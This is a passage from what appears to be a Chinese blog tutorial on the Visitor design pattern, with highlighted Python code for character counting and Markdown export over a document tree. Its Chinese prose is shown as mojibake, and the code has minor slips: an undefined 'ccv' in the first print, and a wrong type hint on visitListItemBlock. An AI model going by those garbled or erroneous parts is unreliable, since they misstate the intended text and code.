&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Element&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">char_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">raise&lt;/span> &lt;span class="ne">NotImplementedError&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Block&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Element&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">char_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">char_count&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">RichText&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Element&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">char_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">FileLink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Element&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">char_count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Page&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">total_count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">page&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">char_count&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;total char count: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">ccv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">total_count&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¯¥å®ç°ä¼šé€’å½’ç»Ÿè®¡æ•´ä¸ªæ–‡æ¡£ç»“æ„æ ‘ï¼Œå¹¶è¿”å›æœ€ç»ˆçš„æ€»å’Œã€‚&lt;/p>
&lt;p>æ­¤æ—¶ï¼Œç±»å›¾å˜æˆç±»ä¼¼è¿™æ ·ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/visitor-page-class2.png">
&lt;/figure>
&lt;p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡ä¸ºåŸºç±» &lt;code>Element&lt;/code> å¢åŠ ä¸€ä¸ªæ–¹æ³• &lt;code>char_count()&lt;/code>, å¹¶åœ¨ç›¸åº”çš„å­ç±»ä¸­å®ç°è¯¥æ–¹æ³•ï¼Œæ¥å®ç°å­—ç¬¦ä¸ªæ•°çš„ç»Ÿè®¡åŠŸèƒ½ã€‚&lt;/p>
&lt;h4 id="æ–‡æ¡£å¯¼å‡º">æ–‡æ¡£å¯¼å‡º&lt;/h4>
&lt;p>å¦‚æœä»…ä»…æ˜¯å¢åŠ ä¸€ä¸ªå­—ç¬¦ä¸ªæ•°ç»Ÿè®¡åŠŸèƒ½ï¼Œä¸Šè¿°æ–¹æ³•çœ‹èµ·æ¥å¹¶æ— å¤§ç¢ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹ï¼Œå¦‚æœè¦å¢åŠ æ–‡æ¡£å¯¼å‡ºåŠŸèƒ½ï¼Œæ¯”å¦‚éœ€è¦æ”¯æŒå¯¼å‡ºä¸ºå¦‚ä¸‹ä¸åŒæ ¼å¼çš„æ–‡æ¡£ï¼š&lt;/p>
&lt;ul>
&lt;li>markdown&lt;/li>
&lt;li>html&lt;/li>
&lt;li>pdf&lt;/li>
&lt;li>çº¯æ–‡æœ¬&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>æˆ‘ä»¬åº”è¯¥å¦‚ä½•åº”å¯¹ï¼Ÿå¦‚æœå»¶ç»­ä¸Šé¢çš„ç®€å•æ–¹æ¡ˆï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ &lt;code>Element&lt;/code> ä¸­å¢åŠ ç±»ä¼¼ä¸‹é¢çš„æ¥å£ï¼š&lt;/p>
&lt;ul>
&lt;li>export_markdown()&lt;/li>
&lt;li>export_html()&lt;/li>
&lt;li>export_pdf()&lt;/li>
&lt;li>export_text()&lt;/li>
&lt;li>&amp;hellip;&lt;/li>
&lt;/ul>
&lt;p>å¦‚æœæˆ‘ä»¬å¸Œæœ›å†å¢åŠ ä¸€ä¸ªæ‹¼å†™æ£€æŸ¥çš„åŠŸèƒ½ï¼Œå¯èƒ½è¿˜éœ€è¦å¢åŠ ä¸€ä¸ª &lt;code>spellcheck()&lt;/code> æ–¹æ³•ã€‚è¿™æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªç†æƒ³çš„æ–¹æ¡ˆï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬çš„ç±»ç»“æ„ååˆ†çš„ä¸ç¨³å®šï¼ŒåŸºç±»å’Œå­ç±»çš„æ¥å£ä¸æ–­è†¨èƒ€ã€ä¸æ–­å¼•å…¥æ–°çš„å˜åŒ–ç‚¹ï¼Œæ—¢ä¸ç¬¦åˆ&lt;a href="https://mincodes.com/posts/design-patterns/#single-responsibility-principle-å•ä¸€èŒè´£åŸåˆ™">å•ä¸€èŒè´£åŸåˆ™&lt;/a>ï¼Œä¹Ÿä¸ç¬¦åˆ&lt;a href="https://mincodes.com/posts/design-patterns/#open-closed-principle-å¼€é—­åŸåˆ™">å¼€é—­åŸåˆ™&lt;/a>ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ç§æ–¹æ¡ˆä¸‹çš„ç±»å›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/visitor-page-class3.png">
&lt;/figure>
&lt;h4 id="å¼•å…¥è®¿é—®è€…æ¨¡å¼">å¼•å…¥è®¿é—®è€…æ¨¡å¼&lt;/h4>
&lt;p>å¦‚ä½•åœ¨ä¸ä¿®æ”¹ &lt;code>Element&lt;/code> åŠå…¶å­ç±»ç»“æ„çš„å‰æä¸‹ï¼Œä¸ºæˆ‘ä»¬çš„æ–‡æ¡£æ¨¡å‹æ–°å¢å„ç§ä¸åŒç±»å‹çš„æ“ä½œå‘¢ï¼Ÿè®¿é—®è€…æ¨¡å¼å¯ä»¥å¸®åŠ©æˆ‘ä»¬è§£å†³è¿™ç±»é—®é¢˜ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹å¼•å…¥è®¿é—®è€…æ¨¡å¼ä¹‹åï¼Œå­—ç¬¦ç»Ÿè®¡åŠŸèƒ½ä¼šæ€ä¹ˆå†™ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Element&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">raise&lt;/span> &lt;span class="ne">NotImplementedError&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Block&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Element&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">visitBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">RichText&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Element&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">visitRichText&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">FileLink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Element&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">visitFileLink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">ListItemBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Block&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">v&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">visitListItemBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">children&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Visitor&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Block&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitRichText&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">RichText&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitFileLink&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">FileLink&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitListItemBlock&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">FileLink&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">CharCountVisitor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">total_count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitRichText&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">RichText&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">total_count&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ccv&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CharCountVisitor&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">page&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">accept&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ccv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;total char count: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">ccv&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">total_count&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>çœ‹èµ·æ¥ä¼¼ä¹å˜å¤æ‚äº†ï¼Œä½†æ˜¯é€šç”¨æ€§å’Œæ‰©å±•æ€§å¾—åˆ°äº†å¤§å¹…æå‡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæƒ³å¢åŠ ä¸€ä¸ª
markdown å¯¼å‡ºåŠŸèƒ½ï¼Œåªéœ€æ–°å¢ä¸€ä¸ª &lt;code>MarkdownExporterVisitor&lt;/code> å³å¯ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">MarkdownExporterVisitor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Visitor&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">visitRichText&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">RichText&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">font_weight&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;italic&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;*&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">*&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">font_weight&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;bold&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;**&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">**&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
